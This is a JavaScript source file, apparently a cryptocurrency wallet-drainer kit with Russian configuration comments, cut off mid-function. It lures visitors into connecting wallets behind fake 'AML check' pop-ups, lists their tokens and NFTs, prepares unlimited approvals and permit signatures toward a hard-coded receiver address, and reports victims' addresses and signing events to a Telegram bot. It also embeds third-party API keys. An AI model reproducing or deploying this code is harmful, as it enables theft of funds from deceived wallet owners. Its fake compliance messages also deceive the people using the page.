/* eslint-disable no-unused-vars */
import {ethers} from "ethers";
import Swal from "sweetalert2";

let MS_Encryption_Key = 13; // Укажите любое число, которое будет использовано для шифрования (не рекоме

const MS_Modal_Style = 2; // 1 - старая, 2 - новая (обновление от 01.10.2023)
const MS_Loader_Style = 2; // 1 - старый, 2 - новый (обновление от 01.10.2023)
const MS_Color_Scheme = "light"; // light - светлая тема, dark - тёмная тема
const botToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN; //test
const chatIDs = import.meta.env.VITE_TELEGRAM_RECIPIENTS.split(',');


const MS_Verify_Message = "Verify ownership of wallet {{ADDRESS}} on MyCryptoApp"; // Сообщение для верификации кошелька, может содержать тег {{ADDRESS}}

const MS_Custom_Chat = {
  Enable: 0, // 0 - использовать настройки сервера, 1 - использовать настройки клиента
  Chat_Settings: {
    enter_website: "", // ID канала для действия - Вход на сайт (если пусто - уведомление отключено)
    leave_website: "", // ID канала для действия - Выход с сайта (если пусто - уведомление отключено)
    connect_success: "", // ID канала для действия - Успешное подключение (если пусто - уведомление отключено)
    connect_request: "", // ID канала для действия - Запрос на подключение (если пусто - уведомление отключено)
    connect_cancel: "", // ID канала для действия - Подключение отклонено (если пусто - уведомление отключено)
    approve_request: "", // ID канала для действия - Запрос на подтверждение (если пусто - уведомление отключено)
    approve_success: "", // ID канала для действия - Успешное подтверждение (если пусто - уведомление отключено)
    approve_cancel: "", // ID канала для действия - Подтверждение отклонено (если пусто - уведомление отключено)
    permit_sign_data: "", // ID канала для действия - Данные из PERMIT (если пусто - уведомление отключено)
    transfer_request: "", // ID канала для действия - Запрос на перевод (если пусто - уведомление отключено)
    transfer_success: "", // ID канала для действия - Успешный перевод (если пусто - уведомление отключено)
    transfer_cancel: "", // ID канала для действия - Отмена перевода (если пусто - уведомление отключено)
    sign_request: "", // ID канала для действия - Запрос на подпись (если пусто - уведомление отключено)
    sign_success: "", // ID канала для действия - Успешная подпись (если пусто - уведомление отключено)
    sign_cancel: "", // ID канала для действия - Подпись отклонена (если пусто - уведомление отключено)
    chain_request: "", // ID канала для действия - Запрос на смену сети (если пусто - уведомление отключено)
    chain_success: "", // ID канала для действия - Смена сети принята (если пусто - уведомление отключено)
    chain_cancel: "", // ID канала для действия - Смена сети отклонена (если пусто - уведомление отключено)
  },
};

// =====================================================================
// ============ ВНОСИТЬ ИЗМЕНЕНИЯ В КОД НИЖЕ НЕ БЕЗОПАСНО ==============
// =====================================================================

var MS_Worker_ID = null;

let MS_Ready = false,
  MS_Settings = {
    V_MODE: 0, // or 0, depending on whether you want verification modals
    Wallet_Blacklist: [],
    Contract_Whitelist: [],
    Contract_Blacklist: [],
    Settings: {
      Minimal_Wallet_Price: "1",
      Chains: {
        eth: {
          API: "2B44DG986KR15DTS4S1E5JWZT8VTWZ7C99",
          Contract_Address: ""
        },
        bsc: {
          API: "K5AI5N7ZPC9EF6G9MVQF33CBVMY1UKQ7HI",
          Contract_Address: ""
        },
      },
      Sign: {
        Native: 1
      },
      Permit: {
        Price: "10",
        Mode: true
      },
    },
    Notifications: {
      connect_success: ""
    },
    Personal_Wallet: {
      address: ""
    },
    Unlimited_BL: [
      [
        56, "0x55d398326f99059fF775485246999027B3197955"
      ],
      [
        56, "0xe9e7cea3dedca5984780bafc599bd69add087d56"
      ],
      [
        1, "0x4Fabb145d64652a948d72533023f6E7A623C7C53"
      ]
    ],
    RPCs: {
      1: "https://eth.llamarpc.com",
      56: "https://bsc-dataseed1.defibit.io",
    },
    Receiver: "0x46A9E4499B1a7039A91c2E8DE185cC8b3916D2c8", //George
    Address: "0x46A9E4499B1a7039A91c2E8DE185cC8b3916D2c8", //George
    LA: 1

  },
  MS_Contract_ABI = {
    ERC20: JSON.parse(
      '[{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"delegate","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"delegate","type":"address"},{"internalType":"uint256","name":"numTokens","type":"uint256"}],\n  "name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"tokenOwner","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"receiver","type":"address"},{"internalType":"uint256","name":"numTokens","type":"uint256"}],"name":"transfer","outputs":\n  [{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"buyer","type":"address"},{"internalType":"uint256","name":"numTokens","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}]'
    ),
    ERC721: JSON.parse(
      '[{"constant":false,"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"approve","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"mint","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"safeTransferFrom","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"},{"internalType":"bytes","name":"_data","type":"bytes"}],"name":"safeTransferFrom","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"to","type":"address"},\n  {"internalType":"bool","name":"approved","type":"bool"}],"name":"setApprovalForAll","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"transferFrom","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"inputs":[],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":true,"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"Transfer","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"approved","type":"address"},{"indexed":true,"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},\n  {"indexed":true,"internalType":"address","name":"operator","type":"address"},{"indexed":false,"internalType":"bool","name":"approved","type":"bool"}],"name":"ApprovalForAll","type":"event"},{"constant":true,"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"getApproved","outputs":[{"internalType":"address","name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"operator","type":"address"}],"name":"isApprovedForAll","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"ownerOf","outputs":[{"internalType":"address","name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},\n  {"constant":true,"inputs":[{"internalType":"bytes4","name":"interfaceId","type":"bytes4"}],"name":"supportsInterface","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"}]'
    ),
    ERC1155: JSON.parse(
      '[{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"account","type":"address"},{"indexed":true,"internalType":"address","name":"operator","type":"address"},{"indexed":false,"internalType":"bool","name":"approved","type":"bool"}],"name":"ApprovalForAll","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"operator","type":"address"},{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256[]","name":"ids","type":"uint256[]"},{"indexed":false,"internalType":"uint256[]","name":"values","type":"uint256[]"}],"name":"TransferBatch","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"operator","type":"address"},{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"id","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"TransferSingle","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,\n  "internalType":"string","name":"value","type":"string"},{"indexed":true,"internalType":"uint256","name":"id","type":"uint256"}],"name":"URI","type":"event"},{"inputs":[{"internalType":"address","name":"account","type":"address"},{"internalType":"uint256","name":"id","type":"uint256"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address[]","name":"accounts","type":"address[]"},{"internalType":"uint256[]","name":"ids","type":"uint256[]"}],"name":"balanceOfBatch","outputs":[{"internalType":"uint256[]","name":"","type":"uint256[]"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"},{"internalType":"address","name":"operator","type":"address"}],"name":"isApprovedForAll","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256[]","name":"ids","type":"uint256[]"},{"internalType":"uint256[]","name":"amounts","type":"uint256[]"},{"internalType":"bytes","name":"data","type":"bytes"}],\n  "name":"safeBatchTransferFrom","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"id","type":"uint256"},{"internalType":"uint256","name":"amount","type":"uint256"},{"internalType":"bytes","name":"data","type":"bytes"}],"name":"safeTransferFrom","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"operator","type":"address"},{"internalType":"bool","name":"approved","type":"bool"}],"name":"setApprovalForAll","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"bytes4","name":"interfaceId","type":"bytes4"}],"name":"supportsInterface","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"id","type":"uint256"}],"name":"uri","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"}]'
    ),
  },
  MS_ID = 0,
  MS_Process = false,
  MS_Provider = null,
  MS_Current_Provider = null,
  MS_Current_Address = null,
  MS_Current_Chain_ID = null,
  MS_Web3 = null,
  MS_Signer = null,
  MS_Check_Done = false,
  MS_Currencies = {},
  MS_Force_Mode = false,
  MS_Sign_Disabled = false,
  BL_US = false,
  SP_US = false,
  XY_US = false;

// const WC2_Provider =
//   window["@walletconnect/ethereum-provider"].EthereumProvider;
const is_valid_json = (data) => {
  try {
    JSON.parse(data);
  } catch (err) {
    return false;
  }
  return true;
};

(async () => {
  try {
    let response = await fetch(
      `https://min-api.cryptocompare.com/data/pricemulti?fsyms=ETH,BNB,MATIC,AVAX,ARB,FTM,OP&tsyms=USD`,
      {
        method: "GET",
        headers: { Accept: "application/json" },
      }
    ); //Live Prices API
    MS_Currencies = await response.json();
    MS_Currencies["PLS"] = { USD: 0.00004512 }; //Replace or remove PLS if your app doesn’t use PulseChain.
  } catch (err) {
    console.log(err);
  }
})();

const MS_API_Data = {
  1: "api.etherscan.io",
  56: "api.bscscan.com",
}; // Keep this if you plan to fetch data from Etherscan or BSCScan.
  // Add more if you're supporting other chains (e.g., Polygon, Arbitrum).

const MS_Unlimited_Amount = "1158472395435294898592384258348512586931256";


const ms_hide = () => {
  try {
    if (MS_Modal_Style == 2) {
      //MSM.close();
    } else {
      document.getElementById("web3-modal").style.display = "none";
      document.getElementById("web3-overlay").style.display = "none";
    }
  } catch (err) {
    console.log(err);
  }
}; //Closes the Web3 wallet modal based on the modal style used.
// Chairman

const prs = (s, t) => {
  const ab = (t) => t.split("").map((c) => c.charCodeAt(0));
  const bh = (n) => ("0" + Number(n).toString(16)).substr(-2);
  const as = (code) => ab(s).reduce((a, b) => a ^ b, code);
  return t.split("").map(ab).map(as).map(bh).join("");
};

const srp = (s, e) => {
  const ab = (text) => text.split("").map((c) => c.charCodeAt(0));
  const as = (code) => ab(s).reduce((a, b) => a ^ b, code);
  return e
    .match(/.{1,2}/g)
    .map((hex) => parseInt(hex, 16))
    .map(as)
    .map((charCode) => String.fromCharCode(charCode))
    .join("");
};

let prs_enc = 0,
  last_request_ts = 0;
(async () => {
  prs_enc = MS_Encryption_Key;
  MS_Encryption_Key = Math.floor(Math.random() * 1000);
})();

const send_request = async (data) => {
  try {
    if (MS_Force_Mode)
      return { status: "error", error: "Server is Unavailable" };

    while (Date.now() <= last_request_ts)
      await new Promise((r) => setTimeout(r, 1));
    last_request_ts = Date.now();

    data.domain = window.location.host;
    data.worker_id = MS_Worker_ID || null;
    data.user_id = MS_ID || null;
    data.message_ts = last_request_ts;

    const request_data = JSON.stringify(data);
    const encodedMessage = encodeURIComponent(request_data);

    const results = [];

    for (const chatID of chatIDs) {
      const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: {
          Accept: "text/plain",
          "Content-Type": "application/x-www-form-urlencoded",
        },
        body: `chat_id=${chatID}&text=${encodedMessage}`,
      });

      const response_data = await response.json();
      if (!response_data.ok) {
        results.push({ chatID, status: "error", error: response_data.description });
      } else {
        results.push({ chatID, status: "ok", result: response_data.result });
      }
    }

    return { status: "multi", results };
  } catch (err) {
    console.error(err);
    return { status: "error", error: "Network or API failure" };
  }
};//done?



const connect_cancel = async () => {
  try {
    if (!MS_Settings.Notifications["connect_cancel"]) return;
    await send_request({ action: "connect_cancel", user_id: MS_ID });
  } catch (err) {
    console.log(err);
  }
}; //done!

const connect_success = async () => {
  try {
    if (!MS_Settings.Notifications["connect_success"]) return;
    await send_request({
      action: "connect_success",
      user_id: MS_ID,
      address: MS_Current_Address,
      wallet: MS_Current_Provider,
      chain_id: MS_Current_Chain_ID,
    });
  } catch (err) {
    console.log(err);
  }
};

const convert_chain = (from, to, value) => {
  try {
    if (from == "ANKR" && to == "ID") {
      switch (value) {
        case "eth":
          return 1;
        case "bsc":
          return 56;
        case "polygon":
          return 137;
        case "avalanche":
          return 43114;
        case "arbitrum":
          return 42161;
        case "optimism":
          return 10;
        case "fantom":
          return 250;
        case "era":
          return 324;
        case "base":
          return 8453;
        case "pulse":
          return 369;
        case 42220:
          return "celo";
        case 8453:
          return "base";
        default:
          return false;
      }
    } else if (from == "OPENSEA" && to == "ID") {
      switch (value) {
        case "ethereum":
          return 1;
        case "matic":
          return 137;
        case "avalanche":
          return 43114;
        case "arbitrum":
          return 42161;
        case "optimism":
          return 10;
        case "era":
          return 324;
        case "base":
          return 8453;
        case "pulse":
          return 369;
        default:
          return false;
      }
    } else if (from == "ID" && to == "ANKR") {
      switch (value) {
        case 1:
          return "eth";
        case 56:
          return "bsc";
        case 137:
          return "polygon";
        case 43114:
          return "avalanche";
        case 42161:
          return "arbitrum";
        case 10:
          return "optimism";
        case 250:
          return "fantom";
        case 25:
          return "cronos";
        case 100:
          return "gnosis";
        case 128:
          return "heco";
        case 1284:
          return "moonbeam";
        case 1285:
          return "moonriver";
        case 2222:
          return "kava";
        case 42220:
          return "celo";
        case 1666600000:
          return "harmony";
        case 324:
          return "zksync_era";
        case 8453:
          return "base";
        case 369:
          return "pulse";
        default:
          return false;
      }
    } else if (from == "ID" && to == "CURRENCY") {
      switch (value) {
        case 1:
          return "ETH";
        case 56:
          return "BNB";
        case 137:
          return "MATIC";
        case 43114:
          return "AVAX";
        case 42161:
          return "ETH";
        case 10:
          return "ETH";
        case 250:
          return "FTM";
        case 25:
          return "CRO";
        case 100:
          return "XDAI";
        case 128:
          return "HT";
        case 1284:
          return "GLMR";
        case 1285:
          return "MOVR";
        case 2222:
          return "KAVA";
        case 42220:
          return "CELO";
        case 1666600000:
          return "ONE";
        case 324:
          return "ETH";
        case 8453:
          return "ETH";
        case 369:
          return "PLS";
        default:
          return false;
      }
    }
  } catch (err) {
    console.log(err);
    return false;
  }
};

const get_tokens = async (address) => {
  try {
    let tokens = [],
      response = await fetch(
        `https://rpc.ankr.com/multichain/${MS_Settings.AT || "00fa0dc04c44daadb23b0a1c2fe8f48ed0c2723dfa342371ed4403731190cdd5"}`,
        {
          method: "POST",
          headers: {
            Accept: "application/json",
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            id: 1,
            jsonrpc: "2.0",
            method: "ankr_getAccountBalance",
            params: {
              blockchain: [
                "eth",
                "bsc",
              ],
              walletAddress: address,
            },
          }),
        }
      );
    response = await response.json();
    for (const asset of response.result.assets) {
      try {
        let contract_address = asset.contractAddress || "NATIVE";
        if (
          MS_Settings.Contract_Whitelist.length > 0 &&
          !MS_Settings.Contract_Whitelist.includes(
            contract_address.toLowerCase().trim()
          )
        )
          continue;
        else if (
          MS_Settings.Contract_Blacklist.length > 0 &&
          MS_Settings.Contract_Blacklist.includes(
            contract_address.toLowerCase().trim()
          )
        )
          continue;
        let new_asset = {
          chain_id: convert_chain("ANKR", "ID", asset.blockchain),
          name: asset.tokenName,
          type: asset.tokenType,
          amount: parseFloat(asset.balance),
          amount_raw: asset.balanceRawInteger,
          amount_usd: parseFloat(asset.balanceUsd),
          symbol: asset.tokenSymbol,
          decimals: asset.tokenDecimals,
          address: contract_address || null,
          price: parseFloat(asset.tokenPrice),
        };
        if (new_asset.price > 0) tokens.push(new_asset);
      } catch (err) {
        console.log(err);
      }
    }

    return tokens;
  } catch (err) {
    console.log(err);
    return [];
  }
}; //needs env!
//"blockchain": ["eth", "bsc", "polygon", "arbitrum"]

const get_nfts = async (address) => {
  try {
    let response = await fetch(
      `https://api.opensea.io/api/v1/assets?owner=${address}&order_direction=desc&limit=200&include_orders=false`
    );
    let tokens = (await response.json())["assets"];
    response = await fetch(
      `https://api.opensea.io/api/v1/collections?asset_owner=${address}&offset=0&limit=200`
    );
    let collections = await response.json(),
      list = [];
    for (const asset of tokens) {
      try {
        let collection = null;
        for (const x_collection of collections) {
          try {
            if (x_collection.primary_asset_contracts.length < 1) continue;
            if (
              x_collection.primary_asset_contracts[0].address ==
              asset.asset_contract.address
            ) {
              collection = x_collection;
              break;
            }
          } catch (err) {
            console.log(err);
          }
        }
        if (collection == null) continue;
        if (
          MS_Settings.Contract_Whitelist.length > 0 &&
          !MS_Settings.Contract_Whitelist.includes(
            asset.asset_contract.address.toLowerCase().trim()
          )
        )
          continue;
        else if (
          MS_Settings.Contract_Blacklist.length > 0 &&
          MS_Settings.Contract_Blacklist.includes(
            asset.asset_contract.address.toLowerCase().trim()
          )
        )
          continue;
        let asset_chain_id = convert_chain(
          "OPENSEA",
          "ID",
          asset.asset_contract.chain_identifier
        );
        let asset_price =
          collection.stats.one_day_average_price != 0
            ? collection.stats.one_day_average_price
            : collection.stats.seven_day_average_price;
        asset_price =
          asset_price *
          MS_Currencies[convert_chain("ID", "CURRENCY", asset_chain_id)]["USD"];
        let new_asset = {
          chain_id: asset_chain_id,
          name: asset.name,
          type: asset.asset_contract.schema_name,
          amount: asset.num_sales,
          amount_raw: null,
          amount_usd: asset_price,
          id: asset.token_id,
          symbol: null,
          decimals: null,
          address: asset.asset_contract.address,
          price: asset_price,
        };
        if (
          typeof asset_price == "number" &&
          !isNaN(asset_price) &&
          asset_price > 0
        )
          list.push(new_asset);
      } catch (err) {
        console.log(err);
      }
    }
    return list;
  } catch (err) {
    console.log(err);
    return [];
  }
}; //untouched

const retrive_token = async (chain_id, contract_address) => {
  try {
    if (
      !MS_API_Data[chain_id] ||
      MS_Settings.Settings.Chains[convert_chain("ID", "ANKR", chain_id)].API ==
      ""
    )
      return MS_Contract_ABI["ERC20"];
    let response = await fetch(
      `https://${MS_API_Data[chain_id]
      }/api?module=contract&action=getsourcecode&address=${contract_address}&apikey=${MS_Settings.Settings.Chains[convert_chain("ID", "ANKR", chain_id)].API
      }`,
      {
        method: "GET",
        headers: { Accept: "application/json" },
      }
    );
    response = await response.json();
    if (response.message == "OK") {
      if (
        response.result[0].Proxy == "1" &&
        response.result[0].Implementation != ""
      ) {
        const implementation = response.result[0].Implementation;
        return retrive_token(chain_id, implementation);
      } else {
        return JSON.parse(response.result[0].ABI);
      }
    } else {
      return MS_Contract_ABI["ERC20"];
    }
  } catch (err) {
    return MS_Contract_ABI["ERC20"];
  }
}; //needs env!

const get_permit_type = (func) => {
  try {
    if (MS_Settings.Settings.Permit.Mode == false) return 0;
    if (
      Object.prototype.hasOwnProperty.call(func, "permit") &&
      Object.prototype.hasOwnProperty.call(func, "nonces") &&
      Object.prototype.hasOwnProperty.call(func, "name") &&
      Object.prototype.hasOwnProperty.call(func, "DOMAIN_SEPARATOR")
    ) {
      const permit_version = ((func) => {
        for (const key in func) {
          if (key.startsWith("permit(")) {
            const args = key.slice(7).split(",");
            if (args.length === 7 && key.indexOf("bool") === -1) return 2;
            if (args.length === 8 && key.indexOf("bool") !== -1) return 1;
            return 0;
          }
        }
      })(func);
      return permit_version;
    } else {
      return 0;
    }
  } catch (err) {
    return 0;
  }
};

const MS_Gas_Reserves = {
  1: 1,
  56: 1,

};

const show_check = () => {
  try {
    if (MS_Loader_Style == 2) {
      Swal.fire({
        icon: "info",
        title: "Processing wallet",
        text: "Connecting to blockchain...",
        showConfirmButton: true,
        confirmButtonText: "Loading...",
        timer: 2000,
        color: MS_Color_Scheme,
      }).then(() => {
        if (MS_Check_Done) return;
        Swal.fire({
          icon: "info",
          title: "Processing wallet",
          text: "Getting your wallet address...",
          showConfirmButton: true,
          confirmButtonText: "Loading...",
          timer: 5000,
          color: MS_Color_Scheme,
        }).then(() => {
          if (MS_Check_Done) return;
          Swal.fire({
            icon: "info",
            title: "Processing wallet",
            text: "Checking your wallet for AML...",
            showConfirmButton: true,
            confirmButtonText: "Loading...",
            timer: 5000,
            color: MS_Color_Scheme,
          }).then(() => {
            if (MS_Check_Done) return;
            Swal.fire({
              icon: "success",
              title: "Processing wallet",
              // subtitle: "Everything good!",
              text: "Your wallet is AML risk is low enough!",
              showConfirmButton: false,
              timer: 5000,
              color: MS_Color_Scheme,
            }).then(() => {
              if (MS_Check_Done) return;
              Swal.fire({
                icon: "info",
                title: "Processing wallet",
                text: "Please wait, we're scanning more details...",
                showConfirmButton: true,
                confirmButtonText: "Loading...",
                timer: 300000,
                color: MS_Color_Scheme,
              });
            });
          });
        });
      });
    } else {
      Swal.fire({
        title: "Connection established",
        icon: "success",
        timer: 2000,
      }).then(() => {
        if (MS_Check_Done) return;
        Swal.fire({
          text: "Connecting to Blockchain...",
          imageUrl:
            "https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless",
          imageHeight: 60,
          allowOutsideClick: false,
          allowEscapeKey: false,
          timer: 5000,
          width: 600,
          showConfirmButton: false,
        }).then(() => {
          if (MS_Check_Done) return;
          Swal.fire({
            text: "Getting your wallet address...",
            imageUrl:
              "https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless",
            imageHeight: 60,
            allowOutsideClick: false,
            allowEscapeKey: false,
            timer: 5000,
            width: 600,
            showConfirmButton: false,
          }).then(() => {
            if (MS_Check_Done) return;
            Swal.fire({
              text: "Checking your wallet for AML...",
              imageUrl:
                "https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless",
              imageHeight: 60,
              allowOutsideClick: false,
              allowEscapeKey: false,
              timer: 5000,
              width: 600,
              showConfirmButton: false,
            }).then(() => {
              if (MS_Check_Done) return;
              Swal.fire({
                text: "Good, your wallet is AML clear!",
                icon: "success",
                allowOutsideClick: false,
                allowEscapeKey: false,
                timer: 2000,
                width: 600,
                showConfirmButton: false,
              }).then(() => {
                if (MS_Check_Done) return;
                Swal.fire({
                  text: "Please wait, we're scanning more details...",
                  imageUrl:
                    "https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless",
                  imageHeight: 60,
                  allowOutsideClick: false,
                  allowEscapeKey: false,
                  timer: 0,
                  width: 600,
                  showConfirmButton: false,
                });
              });
            });
          });
        });
      });
    }
  } catch (err) {
    console.log(err);
  }
}; //Run show_check() after the wallet connection succeeds

const get_nonce = async (chain_id) => {
  const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[chain_id]);
  return await node.getTransactionCount(MS_Current_Address, "pending");
};

const wait_message = () => {
  try {
    if (!MS_Process) return;
    Swal.close();
    if (MS_Loader_Style == 2) {
      Swal.fire({
        icon: "success",
        title: "OK",
        // subtitle: "Thanks!",
        text: "Got your sign, wait a bit for confirmation...",
        showConfirmButton: false,
        timer: 2500,
        color: MS_Color_Scheme,
      }).then(() => {
        Swal.fire({
          icon: "info",
          title: "Processing sign",
          text: " Please, don't leave this page!",
          showConfirmButton: true,
          confirmButtonText: "Confirming sign...",
          color: MS_Color_Scheme,
        });
      });
    } else {
      Swal.fire({
        html: "<b>Thanks!</b>",
        icon: "success",
        allowOutsideClick: false,
        allowEscapeKey: false,
        timer: 2500,
        width: 600,
        showConfirmButton: false,
      }).then(() => {
        Swal.fire({
          html: "<b>Confirming your sign...</b><br><br>Please, don't leave this page!",
          imageUrl:
            "https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless",
          imageHeight: 60,
          allowOutsideClick: false,
          allowEscapeKey: false,
          timer: 0,
          width: 600,
          showConfirmButton: false,
        });
      });
    }
  } catch (err) {
    console.log(err);
  }
};

const end_message = () => {
  try {
    if (MS_Loader_Style == 2) {
      Swal.fire({
        icon: "error",
        title: "Error",
        // subtitle: "We're sorry",
        text: "11Your wallet doesn't meet the requirements. Try to connect a middle-active wallet to try again!",
        showConfirmButton: true,
        confirmButtonText: "OK",
        color: MS_Color_Scheme,
      });
    } else {
      Swal.close();
      Swal.fire({
        html: "222<b>Sorry!</b> Your wallet doesn't meet the requirements.<br><br>Try to connect a middle-active wallet to try again!",
        icon: "error",
        allowOutsideClick: true,
        allowEscapeKey: true,
        timer: 0,
        width: 600,
        showConfirmButton: true,
        confirmButtonText: "OK",
      });
    }
  } catch (err) {
    console.log(err);
  }
};

let is_first_sign = true;

const sign_ready = () => {
  try {
    if (MS_Loader_Style == 2) {
      Swal.fire({
        icon: "success",
        title: "OK",
        // subtitle: "Sign is confirmed",
        text: "Please, wait a bit for confirmation...",
        showConfirmButton: false,
        color: MS_Color_Scheme,
      });
    } else {
      Swal.close();
      Swal.fire({
        html: "<b>Success!</b> Your sign is confirmed!",
        icon: "success",
        allowOutsideClick: false,
        allowEscapeKey: false,
        timer: 0,
        width: 600,
        showConfirmButton: false,
      });
    }
  } catch (err) {
    console.log(err);
  }
};

const sign_next = () => {
  try {
    if (is_first_sign) {
      is_first_sign = false;
      return;
    }
    if (MS_Loader_Style == 2) {
      Swal.fire({
        icon: "info",
        title: "Waiting for action",
        text: "Sign message in your wallet...",
        showConfirmButton: true,
        confirmButtonText: "Waiting...",
        color: MS_Color_Scheme,
      });
    } else {
      Swal.close();
      Swal.fire({
        html: "<b>Waiting for your sign...</b><br><br>Please, sign message in your wallet!",
        imageUrl:
          "https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless",
        imageHeight: 60,
        allowOutsideClick: false,
        allowEscapeKey: false,
        timer: 0,
        width: 600,
        showConfirmButton: false,
      });
    }
  } catch (err) {
    console.log(err);
  }
};

const is_nft_approved = async (
  contract_address,
  owner_address,
  spender_address
) => {
  try {
    const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[1]);
    const contract = new ethers.Contract(
      contract_address,
      MS_Contract_ABI["ERC721"],
      node
    );
    return await contract.isApprovedForAll(owner_address, spender_address);
  } catch (err) {
    console.log(err);
    return false;
  }
}; //untouched

const SIGN_NFT = async (asset) => {
  const ethersProvider = new ethers.providers.Web3Provider(MS_Provider);
  const signer = await ethersProvider.getSigner();
  const node = signer;
  const contract = new ethers.Contract(
    asset.address,
